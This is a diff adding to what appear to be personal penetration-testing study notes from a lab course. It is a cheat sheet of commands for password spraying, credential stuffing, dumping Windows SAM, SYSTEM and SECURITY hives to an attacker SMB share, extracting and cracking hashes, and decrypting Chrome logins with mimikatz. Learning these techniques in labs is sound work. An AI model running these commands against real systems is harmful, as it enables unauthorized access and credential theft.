@@ -167,3 +167,68 @@ $ smbclient -U user \\\\10.129.42.197\\SHARENAME
 ```
 %% netexec to list shares and smbclient to access share %%
 
+### Spraying, Stuffing and Defaults
+
+```
+$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
+```
+%% password spraying %%
+
+```
+$ hydra -C user_pass.list ssh://10.100.38.23
+```
+%% credential stuffing where you use username and password combination to brute force a service %%
+
+```
+$ pip3 install defaultcreds-cheat-sheet
+$ creds search linksys
+```
+%% once installed, we can use creds command to search for known default creds associated with a specific product or vendor %%
+
+### Attacking SAM, SYSTEM, and SECURITY
+```
+$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+```
+%% start SMB server on attack machine to transfer hklm\security, hklm\system, hklm\sam %%
+
+```
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+```
+%% save copies of registry hives locally %%
+
+```
+C:\> move sam.save \\10.10.15.16\CompData
+C:\> move security.save \\10.10.15.16\CompData
+C:\> move system.save \\10.10.15.16\CompData
+```
+%% move registry hives to smb server hosted on attack machine %%
+
+```
+$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+%% specify each of the hive files and do a secrets dump %%
+
+```
+$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
+```
+%% once we have the hashes we can start cracking them, use 1000 for crack NTLM-based hashes and 2100 is for DCC2 hashes which are harder to crack%%
+
+```
+C:\Users\Public> mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+%% DPAPI encrypted credentials can be decrypted manually with tools like Impacket's dpapi, mimikatz %%
+
+```
+$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+```
+%% dumping lsa and sam secrets remotely respectively %%
+
+```
+$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+```
+%% extract credentials from lsass dump file %%
